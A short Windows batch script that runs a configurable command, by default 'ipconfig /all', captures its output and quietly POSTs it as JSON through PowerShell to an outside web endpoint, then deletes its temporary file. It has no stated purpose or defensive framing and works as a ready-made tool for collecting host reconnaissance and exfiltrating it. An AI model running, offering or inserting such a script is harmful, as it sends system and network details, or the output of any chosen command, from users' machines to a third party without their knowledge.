@echo off
setlocal

rem ============================================
rem Command to execute
rem ============================================
set "COMMAND=ipconfig /all"

set "TEMPFILE=%TEMP%\cmd_result_%RANDOM%_%RANDOM%.txt"

rem Execute the command and capture stdout + stderr
%COMMAND% > "%TEMPFILE%" 2>&1

rem Convert the result to JSON and POST it
powershell -NoProfile -Command ^
  "$text = [System.IO.File]::ReadAllText('%TEMPFILE%');" ^
  "$json = @{ text = $text } | ConvertTo-Json -Compress;" ^
  "Invoke-RestMethod -Uri 'https://rawreceive.up.railway.app/api/rawtext' -Method Post -ContentType 'application/json' -Body $json"

set "EXITCODE=%ERRORLEVEL%"

del "%TEMPFILE%" >nul 2>&1

exit /b %EXITCODE%
